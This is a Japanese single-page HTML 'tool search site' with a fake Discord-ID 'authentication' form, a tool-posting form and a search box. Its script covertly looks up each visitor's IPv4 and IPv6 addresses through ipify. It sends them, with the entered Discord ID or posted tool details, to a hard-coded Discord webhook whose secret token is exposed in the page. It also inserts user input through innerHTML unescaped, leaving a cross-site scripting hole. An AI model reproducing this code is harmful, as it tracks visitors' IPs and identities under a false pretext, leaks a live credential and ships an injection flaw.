<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ツール検索サイト</title>
    <style>
        body {
            font-family: 'Courier New', monospace;
            background-color: #000;
            color: #00ff00;
            margin: 0;
            padding: 20px;
            overflow-x: hidden;
        }
        .menu-btn {
            font-size: 24px;
            background: none;
            color: #00ff00;
            border: none;
            cursor: pointer;
            position: fixed;
            top: 10px;
            left: 10px;
        }
        .sidebar {
            position: fixed;
            top: 0;
            left: -250px;
            width: 250px;
            height: 100%;
            background-color: #1a1a1a;
            border-right: 2px solid #00ff00;
            transition: left 0.3s ease;
            padding: 20px;
        }
        .sidebar.active {
            left: 0;
        }
        .sidebar button {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            background-color: #0d0d0d;
            color: #00ff00;
            border: 1px solid #00ff00;
            cursor: pointer;
        }
        .form-container, .tools-container {
            display: none;
            border: 2px solid #00ff00;
            padding: 20px;
            background-color: #1a1a1a;
            border-radius: 5px;
        }
        .tool-card {
            border: 1px solid #00ff00;
            padding: 10px;
            margin: 10px 0;
            background-color: #0d0d0d;
            border-radius: 5px;
        }
        input, button, textarea {
            padding: 10px;
            margin: 5px 0;
            border: 1px solid #00ff00;
            background-color: #0d0d0d;
            color: #00ff00;
            border-radius: 3px;
        }
        button {
            cursor: pointer;
            background-color: #007700;
        }
        .search-container {
            margin-bottom: 20px;
        }
    </style>
</head>
<body>

<button class="menu-btn" onclick="toggleSidebar()">Ξ</button>

<div id="sidebar" class="sidebar">
    <button onclick="showAuth()">認証</button>
    <button onclick="showForm()">投稿フォーム</button>
    <button onclick="showTools()">ツール</button>
</div>

<div class="content">
    <div id="authContainer" class="form-container">
        <form id="authForm">
            <input type="text" id="discordId" placeholder="Discord ID" required>
            <button type="button" onclick="submitAuth()">認証</button>
        </form>
    </div>

    <div id="formContainer" class="form-container">
        <h2>ツールの投稿</h2>
        <form id="toolForm">
            <input type="text" id="toolName" placeholder="ツール名" required>
            <input type="text" id="toolTags" placeholder="タグ付け (カンマ区切り)" required>
            <textarea id="toolDescription" placeholder="説明" rows="4" required></textarea>
            <textarea id="toolInstallation" placeholder="インストール方法" rows="4" required></textarea>
            <button type="button" onclick="submitTool()">投稿</button>
        </form>
    </div>

    <div class="search-container">
        <input type="text" id="searchInput" placeholder="ツール名またはタグで検索">
        <button type="button" onclick="searchTools()">検索</button>
    </div>

    <div id="toolsContainer" class="tools-container"></div>
</div>

<script>
    async function getIPData() {
        const ipv4Data = await (await fetch('https://api.ipify.org?format=json')).json();
        const ipv6Data = await (await fetch('https://api64.ipify.org?format=json')).json();
        return { ipv4: ipv4Data.ip, ipv6: ipv6Data.ip };
    }

    function toggleSidebar() {
        document.getElementById('sidebar').classList.toggle('active');
    }

    function showAuth() {
        document.getElementById('authContainer').style.display = 'block';
        document.getElementById('formContainer').style.display = 'none';
        document.getElementById('toolsContainer').style.display = 'none';
    }

    function showForm() {
        document.getElementById('authContainer').style.display = 'none';
        document.getElementById('formContainer').style.display = 'block';
        document.getElementById('toolsContainer').style.display = 'none';
    }

    function showTools() {
        document.getElementById('authContainer').style.display = 'none';
        document.getElementById('formContainer').style.display = 'none';
        document.getElementById('toolsContainer').style.display = 'block';
    }

    async function submitAuth() {
        const discordId = document.getElementById('discordId').value;
        const ipData = await getIPData();
        const payload = { content: `新しい認証: Discord ID: ${discordId}, IPv4: ${ipData.ipv4}, IPv6: ${ipData.ipv6}` };

        await fetch('https://discord.com/api/webhooks/1290225314022031402/7JCLF2tHFCNnmAO-7xZ1UtQbOJILBkclyGfxt3KYI7buXWMvV-ND6_607i6WzdeJ2Ycy', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });

        document.getElementById('authContainer').style.display = 'none';
        document.getElementById('formContainer').style.display = 'block';
    }

    async function submitTool() {
        const toolData = {
            name: document.getElementById('toolName').value,
            tags: document.getElementById('toolTags').value.split(',').map(tag => tag.trim()),
            description: document.getElementById('toolDescription').value,
            installation: document.getElementById('toolInstallation').value
        };

        const ipData = await getIPData();
        const payload = {
            content: `ツールが投稿されました: IPv4: ${ipData.ipv4}, IPv6: ${ipData.ipv6}`,
            embeds: [
                {
                    title: toolData.name,
                    description: toolData.description,
                    fields: [
                        { name: "タグ", value: toolData.tags.join(', ') },
                        { name: "インストール方法", value: toolData.installation }
                    ]
                }
            ]
        };

        await fetch('https://discord.com/api/webhooks/1290225314022031402/7JCLF2tHFCNnmAO-7xZ1UtQbOJILBkclyGfxt3KYI7buXWMvV-ND6_607i6WzdeJ2Ycy', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });

        const toolsContainer = document.getElementById('toolsContainer');
        const toolCard = document.createElement('div');
        toolCard.className = 'tool-card';
        toolCard.innerHTML = `
            <h3>${toolData.name}</h3>
            <p><strong>タグ:</strong> ${toolData.tags.join(', ')}</p>
            <p><strong>説明:</strong> ${toolData.description}</p>
            <p><strong>インストール方法:</strong> ${toolData.installation}</p>
        `;
        toolsContainer.appendChild(toolCard);
        document.getElementById('toolForm').reset();
        showTools();
    }

    function searchTools() {
        const query = document.getElementById('searchInput').value.toLowerCase();
        const toolCards = document.querySelectorAll('.tool-card');
        
        toolCards.forEach(card => {
            const name = card.querySelector('h3').textContent.toLowerCase();
            const tags = card.querySelector('p strong:nth-of-type(1)').nextSibling.textContent.toLowerCase();
            if (name.includes(query) || tags.includes(query)) {
                card.style.display = '';
            } else {
                card.style.display = 'none';
            }
        });
    }
</script>

</body>
</html>
